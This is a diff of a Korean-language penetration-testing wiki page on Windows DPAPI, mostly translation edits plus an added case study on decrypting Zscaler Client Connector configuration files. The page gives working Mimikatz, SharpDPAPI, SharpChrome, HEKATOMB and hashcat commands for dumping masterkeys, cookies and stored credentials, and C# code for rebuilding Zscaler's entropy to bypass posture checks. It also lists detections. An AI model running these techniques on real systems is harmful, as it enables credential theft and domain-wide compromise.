@@ -14,7 +14,7 @@ DPAPI를 사용하는 가장 일반적인 방법은 **`CryptProtectData` 및 `Cr
 
 ### 사용자 키 생성
 
-DPAPI는 각 사용자의 자격 증명을 기반으로 고유한 키( **`pre-key`**라고 함)를 생성합니다. 이 키는 사용자의 비밀번호 및 기타 요소에서 파생되며, 알고리즘은 사용자 유형에 따라 다르지만 최종적으로 SHA1이 됩니다. 예를 들어, 도메인 사용자의 경우 **사용자의 HTLM 해시에 따라 다릅니다**.
+DPAPI는 각 사용자의 자격 증명을 기반으로 고유한 키( **`pre-key`**라고 함)를 생성합니다. 이 키는 사용자의 비밀번호와 기타 요소에서 파생되며, 알고리즘은 사용자 유형에 따라 다르지만 최종적으로 SHA1이 됩니다. 예를 들어, 도메인 사용자의 경우, **사용자의 HTLM 해시에 따라 다릅니다**.
 
 이는 공격자가 사용자의 비밀번호 해시를 얻을 수 있다면 다음을 수행할 수 있기 때문에 특히 흥미롭습니다:
 
@@ -25,7 +25,7 @@ DPAPI는 각 사용자의 자격 증명을 기반으로 고유한 키( **`pre-ke
 
 마스터 키는 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 디렉토리에 저장되며, 여기서 `{SID}`는 해당 사용자의 보안 식별자입니다. 마스터 키는 사용자의 **`pre-key`**로 암호화되어 저장되며, 복구를 위해 **도메인 백업 키**로도 암호화되어 저장됩니다(즉, 동일한 키가 2개의 서로 다른 비밀번호로 2번 암호화되어 저장됨).
 
-도메인 키는 마스터 키를 암호화하는 데 사용되며 도메인 컨트롤러에 있으며 절대 변경되지 않으므로, 공격자가 도메인 컨트롤러에 접근할 수 있다면 도메인 백업 키를 검색하고 도메인 내 모든 사용자의 마스터 키를 복호화할 수 있습니다.
+마스터 키를 암호화하는 데 사용되는 **도메인 키는 도메인 컨트롤러에 있으며 절대 변경되지 않습니다**, 따라서 공격자가 도메인 컨트롤러에 접근할 수 있다면 도메인 백업 키를 검색하고 도메인 내 모든 사용자의 마스터 키를 복호화할 수 있습니다.
 
 암호화된 블롭은 데이터 암호화에 사용된 **마스터 키의 GUID**를 헤더에 포함하고 있습니다.
 
@@ -101,7 +101,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- 사용자의 세션에 있는 경우, **RPC를 사용하여 마스터 키를 복호화하기 위한 백업 키를 DC에 요청**할 수 있습니다. 로컬 관리자인 경우 사용자가 로그인한 상태에서 **그의 세션 토큰을 훔칠** 수 있습니다:
+- 사용자가 세션에 있는 경우, **RPC를 사용하여 마스터 키를 복호화하기 위한 백업 키를 DC에 요청**할 수 있습니다. 로컬 관리자인 경우 사용자가 로그인한 상태에서 **그의 세션 토큰을 훔칠** 수 있습니다:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -150,11 +150,11 @@ search /type:file /path:C:\path\to\file
 # Search a blob inside B64 encoded data
 search /type:base64 [/base:<base64 string>]
 ```
-다음의 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (같은 레포에서) 를 사용하여 DPAPI를 통해 쿠키와 같은 민감한 데이터를 복호화할 수 있습니다.
+다음의 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (같은 저장소에서) 를 사용하여 DPAPI를 통해 쿠키와 같은 민감한 데이터를 복호화할 수 있습니다.
 
 ### 액세스 키 및 데이터
 
-- **SharpDPAPI**를 사용하여 현재 세션의 DPAPI 암호화 파일에서 자격 증명을 가져옵니다:
+- **SharpDPAPI**를 사용하여 현재 세션의 DPAPI 암호화된 파일에서 자격 증명을 가져옵니다:
 ```bash
 # Decrypt user data
 ## Note that 'triage' is like running credentials, vaults, rdg and certificates
@@ -183,7 +183,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-**SharpDPAPI** 도구는 마스터 키 복호화를 위한 이러한 인수도 지원합니다 (도메인의 백업 키를 얻기 위해 `/rpc`를 사용하거나, 평문 비밀번호를 사용하기 위해 `/password`를 사용하거나, DPAPI 도메인 개인 키 파일을 지정하기 위해 `/pvk`를 사용할 수 있는 방법에 유의하세요...):
+**SharpDPAPI** 도구는 마스터 키 복호화를 위한 이러한 인수도 지원합니다 (도메인 백업 키를 얻기 위해 `/rpc`를 사용하거나, 평문 비밀번호를 사용하기 위해 `/password`를 사용하거나, DPAPI 도메인 개인 키 파일을 지정하기 위해 `/pvk`를 사용할 수 있는 방법에 유의하세요...):
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -203,7 +203,7 @@ dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 # SharpDPAPI
 SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
 ```
-**SharpDPAPI** 도구는 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화를 위한 이러한 인수도 지원합니다 (도메인 백업 키를 얻기 위해 `/rpc`를 사용하고, 평문 비밀번호를 사용하기 위해 `/password`, DPAPI 도메인 개인 키 파일을 지정하기 위해 `/pvk`, 현재 사용자의 세션을 사용하기 위해 `/unprotect`를 사용할 수 있는 방법에 주목하세요...):
+**SharpDPAPI** 도구는 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화를 위한 이러한 인수도 지원합니다 (도메인 백업 키를 얻기 위해 `/rpc`를 사용하고, 일반 텍스트 비밀번호를 사용하기 위해 `/password`, DPAPI 도메인 개인 키 파일을 지정하기 위해 `/pvk`, 현재 사용자 세션을 사용하기 위해 `/unprotect`를 사용하는 것이 가능하다는 점에 유의하세요...):
 ```
 Decryption:
 /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
@@ -255,6 +255,7 @@ hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
 이 도구는 Credential 및 Vault 블롭을 구문 분석하고, 크랙된 키로 이를 복호화하여 평문 비밀번호를 내보낼 수 있습니다.
 
+
 ### 다른 머신 데이터 접근
 
 **SharpDPAPI와 SharpChrome**에서는 원격 머신의 데이터에 접근하기 위해 **`/server:HOST`** 옵션을 지정할 수 있습니다. 물론 해당 머신에 접근할 수 있어야 하며, 다음 예제에서는 **도메인 백업 암호화 키가 알려져 있다고 가정합니다**:
@@ -262,15 +263,15 @@ hashcat -m 22102 bob.hc wordlist.txt -O -w4
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
 ```
-## 기타 도구
+## Other tools
 
 ### HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)는 LDAP 디렉토리에서 모든 사용자와 컴퓨터를 추출하고 RPC를 통해 도메인 컨트롤러 백업 키를 추출하는 도구입니다. 스크립트는 모든 컴퓨터의 IP 주소를 확인하고 모든 컴퓨터에서 smbclient를 수행하여 모든 사용자의 DPAPI 블롭을 검색하고 도메인 백업 키로 모든 것을 복호화합니다.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)는 LDAP 디렉토리에서 모든 사용자와 컴퓨터를 추출하고 RPC를 통해 도메인 컨트롤러 백업 키를 추출하는 자동화 도구입니다. 스크립트는 모든 컴퓨터의 IP 주소를 확인하고 모든 컴퓨터에서 smbclient를 수행하여 모든 사용자의 DPAPI 블롭을 검색하고 도메인 백업 키로 모든 것을 복호화합니다.
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-LDAP에서 추출한 컴퓨터 목록으로 모든 서브 네트워크를 찾을 수 있습니다. 알지 못하더라도 가능합니다!
+LDAP에서 추출한 컴퓨터 목록을 사용하면 알지 못했던 모든 서브 네트워크를 찾을 수 있습니다!
 
 ### DonPAPI 2.x (2024-05)
 
@@ -286,22 +287,58 @@ LDAP에서 추출한 컴퓨터 목록으로 모든 서브 네트워크를 찾을
 [**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop)는 Hashcat/JtR 형식으로 출력할 수 있는 마스터키/자격 증명/금고 파일을 위한 C# 파서로, 선택적으로 자동으로 크래킹을 호출할 수 있습니다. Windows 11 24H1까지의 머신 및 사용자 마스터키 형식을 완전히 지원합니다.
 
 
-## 일반적인 탐지
+## Common detections
 
 - `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 및 기타 DPAPI 관련 디렉토리의 파일 접근.
 - 특히 **C$** 또는 **ADMIN$**와 같은 네트워크 공유에서.
 - LSASS 메모리에 접근하거나 마스터키를 덤프하기 위해 **Mimikatz**, **SharpDPAPI** 또는 유사한 도구 사용.
 - 이벤트 **4662**: *객체에 대한 작업이 수행되었습니다* – **`BCKUPKEY`** 객체에 대한 접근과 상관관계가 있을 수 있습니다.
-- 프로세스가 *SeTrustedCredManAccessPrivilege* (자격 증명 관리자)를 요청할 때 이벤트 **4673/4674**
+- 프로세스가 *SeTrustedCredManAccessPrivilege* (Credential Manager)를 요청할 때 이벤트 **4673/4674**
 
 ---
-### 2023-2025 취약점 및 생태계 변화
+### 2023-2025 vulnerabilities & ecosystem changes
 
-* **CVE-2023-36004 – Windows DPAPI 보안 채널 스푸핑** (2023년 11월). 네트워크 접근 권한이 있는 공격자가 도메인 구성원을 속여 악성 DPAPI 백업 키를 검색하게 할 수 있으며, 이를 통해 사용자 마스터키를 복호화할 수 있습니다. 2023년 11월 누적 업데이트에서 패치됨 – 관리자는 DC와 워크스테이션이 완전히 패치되었는지 확인해야 합니다.
-* **Chrome 127 “App-Bound” 쿠키 암호화** (2024년 7월)는 기존 DPAPI 전용 보호를 사용자의 **Credential Manager**에 저장된 추가 키로 대체했습니다. 쿠키의 오프라인 복호화는 이제 DPAPI 마스터키와 **GCM으로 래핑된 앱 바운드 키** 모두를 요구합니다. SharpChrome v2.3 및 DonPAPI 2.x는 사용자 컨텍스트로 실행할 때 추가 키를 복구할 수 있습니다.
+* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (2023년 11월). 네트워크 접근 권한이 있는 공격자가 도메인 구성원을 속여 악성 DPAPI 백업 키를 검색하게 할 수 있으며, 이는 사용자 마스터키의 복호화를 가능하게 합니다. 2023년 11월 누적 업데이트에서 패치됨 – 관리자는 DC와 워크스테이션이 완전히 패치되었는지 확인해야 합니다.
+* **Chrome 127 “App-Bound” cookie encryption** (2024년 7월)은 레거시 DPAPI 전용 보호를 사용자의 **Credential Manager**에 저장된 추가 키로 대체했습니다. 쿠키의 오프라인 복호화는 이제 DPAPI 마스터키와 **GCM으로 래핑된 앱 바운드 키** 모두를 요구합니다. SharpChrome v2.3 및 DonPAPI 2.x는 사용자 컨텍스트로 실행할 때 추가 키를 복구할 수 있습니다.
 
 
-## 참조
+### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID
+
+Zscaler Client Connector는 `C:\ProgramData\Zscaler` 아래에 여러 구성 파일을 저장합니다 (예: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). 각 파일은 **DPAPI (Machine scope)**로 암호화되지만, 공급업체는 디스크에 저장되지 않고 *런타임에 계산된* **커스텀 엔트로피**를 제공합니다.
+
+엔트로피는 두 요소에서 재구성됩니다:
+
+1. `ZSACredentialProvider.dll` 내부에 내장된 하드코딩된 비밀.
+2. 구성에 속하는 Windows 계정의 **SID**.
+
+DLL에 구현된 알고리즘은 다음과 같습니다:
+```csharp
+byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
+byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
+
+// XOR the two buffers byte-by-byte
+byte[] tmp = new byte[secret.Length];
+for (int i = 0; i < secret.Length; i++)
+tmp[i] = (byte)(sid[i] ^ secret[i]);
+
+// Split in half and XOR both halves together to create the final entropy buffer
+byte[] entropy = new byte[tmp.Length / 2];
+for (int i = 0; i < entropy.Length; i++)
+entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
+```
+비밀이 디스크에서 읽을 수 있는 DLL에 내장되어 있기 때문에, **SYSTEM 권한을 가진 모든 로컬 공격자는 어떤 SID에 대해서도 엔트로피를 재생성하고 오프라인에서 블롭을 복호화할 수 있습니다:**
+```csharp
+byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
+byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
+Console.WriteLine(Encoding.UTF8.GetString(clear));
+```
+복호화는 모든 **장치 자세 검사**와 그 예상 값을 포함한 완전한 JSON 구성을 제공합니다. 이는 클라이언트 측 우회 시 매우 유용한 정보입니다.
+
+> TIP: 다른 암호화된 아티팩트(`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`)는 엔트로피 없이 DPAPI로 보호됩니다(`16`개의 제로 바이트). 따라서 SYSTEM 권한을 얻으면 `ProtectedData.Unprotect`로 직접 복호화할 수 있습니다.
+
+## References
+
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
 - [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
